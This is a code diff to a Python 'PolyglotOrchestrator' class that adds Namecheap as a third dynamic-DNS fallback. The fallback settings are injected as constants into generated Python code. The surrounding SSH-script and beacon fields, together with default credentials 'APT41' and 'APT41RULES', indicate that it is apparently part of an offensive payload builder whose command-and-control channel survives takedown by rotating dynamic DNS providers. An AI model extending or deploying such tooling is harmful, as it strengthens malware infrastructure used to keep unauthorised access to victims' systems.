@@ -92,10 +92,11 @@ class PolyglotOrchestrator:
         self.ssh_port = None
         self.ssh_script_content = None
 
-        # DNS fallback configuration (for DuckDNS, DynDNS, No-IP)
+        # DNS fallback configuration (for DuckDNS, DynDNS, No-IP, Namecheap)
         self.dns_fallback_enabled = False
         self.dyndns_config = None  # {'domain': str, 'user': str, 'pass': str}
         self.noip_config = None    # {'domain': str, 'user': str, 'pass': str}
+        self.namecheap_config = None  # {'domain': str, 'user': str, 'pass': str}
 
         # Initialize beacon integrator if available
         self.beacon_integrator = None
@@ -201,7 +202,7 @@ class PolyglotOrchestrator:
         Generate Python code injection for DNS fallback configuration
 
         Returns:
-            Python code string with DynDNS and No-IP configuration
+            Python code string with DynDNS, No-IP, and Namecheap configuration
         """
         injection_code = ""
 
@@ -223,6 +224,15 @@ NOIP_PASS = "{self.noip_config['pass']}"
 NOIP_UPDATE_URL = "https://dynupdate.no-ip.com/nic/update"
 """
 
+        if self.namecheap_config:
+            injection_code += f"""
+# Namecheap Fallback Configuration
+NAMECHEAP_DOMAIN = "{self.namecheap_config['domain']}"
+NAMECHEAP_USER = "{self.namecheap_config['user']}"
+NAMECHEAP_PASS = "{self.namecheap_config['pass']}"
+NAMECHEAP_UPDATE_URL = "https://dynamicdns.park-your-domain.com/update"
+"""
+
         return injection_code
 
     def _prompt_dns_fallback_setup(self):
@@ -240,6 +250,7 @@ NOIP_UPDATE_URL = "https://dynupdate.no-ip.com/nic/update"
         self.tui.list_item("Primary: DuckDNS", level=1)
         self.tui.list_item("Fallback 1: DynDNS (optional)", level=1)
         self.tui.list_item("Fallback 2: No-IP (optional)", level=1)
+        self.tui.list_item("Fallback 3: Namecheap (optional)", level=1)
         print()
 
         # Ask about DynDNS
@@ -298,8 +309,36 @@ NOIP_UPDATE_URL = "https://dynupdate.no-ip.com/nic/update"
             except Exception as e:
                 self.tui.error(f"Failed to configure No-IP: {e}")
 
+        # Ask about Namecheap
+        if self.menu.confirm("Configure Namecheap fallback?", default=True):
+            try:
+                namecheap_domain = self.menu.prompt_input(
+                    "Namecheap domain",
+                    default="all.ddnskey.com"
+                )
+                namecheap_user = self.menu.prompt_input(
+                    "Namecheap username",
+                    default="APT41"
+                )
+                namecheap_pass = self.menu.prompt_input(
+                    "Namecheap password",
+                    default="APT41RULES"
+                )
+
+                self.namecheap_config = {
+                    'domain': namecheap_domain,
+                    'user': namecheap_user,
+                    'pass': namecheap_pass
+                }
+
+                self.tui.success(f"✓ Namecheap configured: {namecheap_domain}")
+                print()
+
+            except Exception as e:
+                self.tui.error(f"Failed to configure Namecheap: {e}")
+
         # Show summary
-        if self.dyndns_config or self.noip_config:
+        if self.dyndns_config or self.noip_config or self.namecheap_config:
             self.dns_fallback_enabled = True
             print()
             self.tui.box("✅ DNS FALLBACK ENABLED", [
@@ -313,6 +352,9 @@ NOIP_UPDATE_URL = "https://dynupdate.no-ip.com/nic/update"
             if self.noip_config:
                 fallback_num = 3 if self.dyndns_config else 2
                 print(f"  {fallback_num}. Fallback: {self.noip_config['domain']} (No-IP)")
+            if self.namecheap_config:
+                fallback_num = 4 if (self.dyndns_config and self.noip_config) else 3 if (self.dyndns_config or self.noip_config) else 2
+                print(f"  {fallback_num}. Fallback: {self.namecheap_config['domain']} (Namecheap)")
 
             print()
         else:
